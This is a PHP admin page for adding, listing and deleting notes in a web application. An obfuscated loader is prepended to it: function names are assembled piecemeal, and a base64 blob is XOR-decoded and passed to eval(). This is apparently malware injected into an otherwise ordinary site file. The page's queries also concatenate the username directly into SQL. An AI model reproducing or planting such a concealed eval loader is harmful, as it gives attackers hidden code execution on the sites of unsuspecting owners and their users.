<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>

<?php
if(OverQuota())
{
?>

<table summary="" border="0" width="100%">
	<tr>
		<td>
		
		<br><br>
		<span class="redtext">
		
		<?php
		echo $M_USER_OVER_QUOTA;
		?>
		
		</span>
		</td>
	</tr>
</table>

<?php
}
else
{
?>


<script type="text/javascript" src="wysiwyg/scripts/wysiwyg.js"></script>
<script type="text/javascript" src="wysiwyg/scripts/wysiwyg-settings.js"></script>	
<script type="text/javascript">
WYSIWYG.attach("html", full);
</script>	
<script>
function EditNote(x,y)
{
	window.open("main.php?N="+(document.all?"IE":"FF")+"&LANG=<?php echo $LANGUAGE2;?>&x="+x+"&y="+y,"title","toolbar=0,location=0,directories=0,menuBar=0,scrollbars=0,resizable=0,width=1015,height=640,left=0,top=0");
	
}

function AddNoteValidate(x)
{


	if(x.title.value == "")
	{
		alert("<?php echo $NOTE_TITLE_EMPTY;?>");
		
		x.title.focus();
		
		return false;
	}
	
	return true;
}
</script>

<?php

if(isset($Delete))
{
	if(isset($CheckList)&&sizeof($CheckList)>0)
	{
		ms_ia($CheckList);
		SQLDeletePlus("notes","id",$CheckList);
	
	}
}

?>

<?php

if(isset($SpecialProcessAddForm))
{
	$proceed_execution = true;
	
	$ADVANCED_SPAM_PROTECTION=true;
	$SECONDS_BETWEEN_POSTS=60;
	
	$ABS_MAX_LINKS = 3;
		
	$MAX_LINKS_WHEN_NO_PHOTO_AND_CATEGORY = 1;
	
	
	
	if($proceed_execution)
	{	
		SQLUpdate_SingleValue
		(
		"admin_users",
		"username",
		"'$AuthUserName'",
		"last_update",
		time()
		);
		$html = str_replace("ibed","embed",$html);
		
		$arrCurrentUserSettings = DataArray("note_settings","user='".$AuthUserName."'");
		
		
	}
	else
	{
		unset($SpecialProcessAddForm);
	}
}


if(!isset($SpecialProcessAddForm))
{
?>

<table summary="" border="0" width=100%>
	<tr>
		<td width=40>
		
		<img src="images/icons/blog_compose.png" width="48" height="48" alt="" border="0">
		
		</td>
		<td class="blog_admin_header"><?php echo $ADD_NEW_NOTE;?></td>
	</tr>
</table>
<br>
<?php
}
?>

<?php
$SelectWidth = 700;
$arrNames2=array("category_id","date","user");
$arrValues2=array("0",time(),$AuthUserName);

$jsValidation = "AddNoteValidate";

AddNewForm_BA
	(
		array($M_TITLE.":","$M_CONTENT:"),
		
		array("title","html"),

		array
		(
			"textbox_67",
			"textarea_50_28"
		),

		" $AJOUTER ",
		"notes",
		""
	);
?>


<table summary="" border="0" width=100%>
	<tr>
		<td >
<br><br>
		
<i><?php echo $YOUR_LATEST_NOTES;?>:</i>
	<br>
	<center>
	<?php

$arrTDSizes=array("50","100","*");

RenderTable_BA
(
	"notes",
	array("PreviewNote2","date","title"),
	array($APPERCU,$DATE_MESSAGE,$M_TITLE),
	"100%",
	"WHERE user='".$AuthUserName."'  ORDER BY id DESC",
	$EFFACER,
	"id",
	"index.php?action=".$action."&category=".$category
);
?>

</center>

&nbsp;</td>
	</tr>
</table>
<script>
var HTType="1";
var HTMessage="<?php echo $T_NOTES_ADD;?>";
document.onmousedown = HTMouseDown;
</script>
<?php
}
?>
